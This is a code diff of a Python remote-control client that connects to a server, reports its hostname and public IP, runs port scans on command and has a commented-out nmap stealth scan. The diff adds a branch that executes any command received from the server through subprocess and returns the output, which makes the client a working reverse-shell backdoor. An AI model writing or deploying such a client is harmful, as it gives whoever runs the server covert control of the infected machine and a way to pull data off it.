@@ -24,7 +24,7 @@ s.connect((address))
 
 hostname = (socket.gethostname())
 public_ip = get_public_ip()
-client_send = (f"Client {hostname} joined: {public_ip}").encode("utf-8")
+client_send = (f"Client {hostname}, {public_ip} joined.").encode("utf-8")
 s.send(client_send)
 while True:
     command = s.recv(1024).decode("utf-8")
@@ -34,16 +34,20 @@ while True:
         send_to_server("Initiating port scan. This will take a minute.")
         hostportscanner.main()
         open_ports = str(hostportscanner.open_ports)
-        #time_passed = str(hostportscanner.main().timepassed)
-        send_to_server(f"Client {hostname} at {public_ip} has open ports: {open_ports}.")
-    elif command == "dir":
-        print("test")
-    elif command == "nmapscan":
-        print(f"Initiating nmap scan. This will take a minute")
-        nmapresult = nmap.nmap_stealth_scan(target=(socket.gethostbyname(hostname)))
-        print(nmapresult)
+        time_passed = str(hostportscanner.timepassed)
+        send_to_server(f"Client {hostname}, {public_ip} has open ports: {open_ports}. Process took {time_passed}s.")
+    elif command == "open ports":
+        try:
+            send_to_server(f"{hostname}, {public_ip} has open ports: {open_ports}")
+        except NameError:
+            send_to_server("Run port scan before running this command!")
+    # elif command == "nmapscan":
+    #     print(f"Initiating nmap scan. This will take a minute")
+    #     nmapresult = nmap.nmap_stealth_scan(target=(socket.gethostbyname(hostname)))
+    #     print(nmapresult)
     else:
-        print(command)
+        output = subprocess.getoutput(command)
+        send_to_server(f"{hostname}, {public_ip}: {output}")
     
 print("Stop device initiated. Disconnecting")
 s.close()
